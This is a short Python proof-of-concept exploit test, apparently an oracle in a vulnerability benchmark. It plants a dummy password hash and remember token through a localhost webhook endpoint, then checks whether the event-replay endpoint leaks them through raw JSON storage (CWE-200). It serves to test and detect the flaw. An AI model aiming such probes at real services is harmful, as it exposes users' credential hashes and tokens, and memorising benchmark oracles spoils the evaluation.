"""PoC exploit: User data leak via raw webhook event replay (CWE-200)."""

from mosaic.oracle.exploit import ExploitTest


class RawMsgWebhookExploit(ExploitTest):
    """Password leak via json.RawMessage in webhook event replay."""

    def __init__(self, base_url: str = "http://localhost:39081"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "gin_rawmsg_webhook"

    def setup(self) -> None:
        """Send a webhook event containing a password hash."""
        self.http_post("/api/webhooks/user-updated", json={
            "user_id": 1,
            "name": "Test User",
            "email": "test@example.com",
            "updated_at": "2024-01-01T00:00:00Z",
            "Password": "$2a$10$abcdefghijklmnopqrstuuABCDEFGHIJKLMNOPQRSTUVWXYZ012",
            "RememberToken": "secret-token-12345",
        })

    def execute(self) -> tuple[bool, str]:
        """Fetch webhook events and check for leaked password."""
        resp = self.http_get("/api/webhooks/events")

        if resp.status_code == 404:
            return False, "Endpoint returned 404."
        if not resp.ok:
            return False, f"HTTP {resp.status_code}: {resp.text[:200]}"

        body = resp.text

        # Check for bcrypt hash in raw response
        if "$2a$" in body or "$2b$" in body:
            return True, (
                "Password hash found in webhook event replay (CWE-200). "
                "json.RawMessage stores and returns the full raw JSON "
                "including the Password field."
            )

        if "secret-token" in body:
            return True, (
                "RememberToken found in webhook event replay (CWE-200). "
                "Raw JSON storage leaks all fields."
            )

        try:
            data = resp.json()
            payload = data.get("data", data)
            if isinstance(payload, list):
                for event in payload:
                    if isinstance(event, dict):
                        if event.get("Password") or event.get("RememberToken"):
                            return True, f"Sensitive fields in event: {list(event.keys())}"
        except Exception:
            pass

        return False, f"No leaked fields found in response: {body[:300]}"
